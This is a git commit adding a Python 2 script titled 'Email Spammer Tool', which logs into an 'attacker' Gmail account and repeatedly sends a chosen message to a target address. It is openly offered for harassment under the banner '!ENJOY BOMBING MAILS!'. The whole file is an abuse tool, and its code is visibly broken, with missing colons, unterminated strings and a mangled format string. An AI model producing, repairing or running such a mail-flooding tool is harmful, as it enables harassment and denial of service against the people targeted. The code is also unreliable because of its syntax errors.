98bd928f310323778df6c62d9ef994c2402f0114
FakoYT <64706907+FakoYT@users.noreply.github.com>
2020-11-16 12:41:36 +0100

    Add files via upload

---
+++ email bomber.py
@@ -0,0 +1,70 @@
+import os
+import smtplib
+import getpass
+import sys
+import time
+
+print '                                                                    
+print '                                                                    
+print '            _________________________________________________       
+print '            |                                               |       
+print '            |               Email Spammer Tool              |       
+print '            |                                               |       
+print '            |                  Version 1.0                  |       
+print '            =                                               =       
+print '            |               Modified by: Fako               |      
+print '            |                                               |       
+print '            |             !ENJOY BOMBING MAILS!             |       
+print '            |                                               |       
+print '            _________________________________________________       
+
+
+print '                                           '
+
+print '       '
+email = raw_input('Your Attacker Gmail Adress:  ')
+print '             '
+user = raw_input('Name:  ')
+print '       '
+passwd = getpass.getpass('Your Attacker Gmail Password:  ')
+
+print '       '
+print '       '
+
+to = raw_input('nTo ')
+
+
+print '    '
+
+body = raw_input('Message ')
+
+print '    '
+
+total = input('Number of send ')
+
+smtp_server = 'smtp.gmail.com'
+port = 587
+
+
+print ''
+
+try
+    server = smtplib.SMTP(smtp_server,port) 
+    server.ehlo()
+    server.starttls()
+    server.login(email,passwd)
+    for i in range(1, total+1)
+        subject = os.urandom(9)
+        msg = 'From ' + user + 'nSubject ' + 'n' + body
+        server.sendmail(email,to,msg)
+        print rE-mails sent %i % i
+        time.sleep(1)
+        sys.stdout.flush()
+    server.quit()
+    print 'n Done !!!'
+except KeyboardInterrupt
+    print '[-] Canceled'
+    sys.exit()
+except smtplib.SMTPAuthenticationError
+    print 'n[!] The username or password you entered is incorrect.'
+    sys.exit()
